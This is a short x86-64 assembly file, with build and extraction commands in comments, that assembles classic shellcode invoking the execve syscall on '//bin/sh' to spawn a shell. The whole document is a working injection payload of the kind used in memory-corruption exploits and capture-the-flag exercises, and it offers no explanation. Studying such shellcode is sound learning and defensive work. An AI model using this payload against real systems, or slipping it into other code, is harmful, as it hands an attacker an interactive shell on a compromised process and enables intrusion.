# gcc -nostartfiles -nostdlib -static -no-pie shellcode.s -static -o shellcode
# objcopy --dump-section .text=shellcode-raw ./shellcode
# hexdump -C  shellcode-raw

.global _start
_start:
.intel_syntax noprefix
    xor rax, rax 
    push rax

    mov rbx, 0x68732f6e69622f2f # hex rep of 'hs/nib//'
    push rbx
    mov rdi, rsp

    xor rsi, rsi
    xor rdx, rdx
    mov al, 59
    syscall
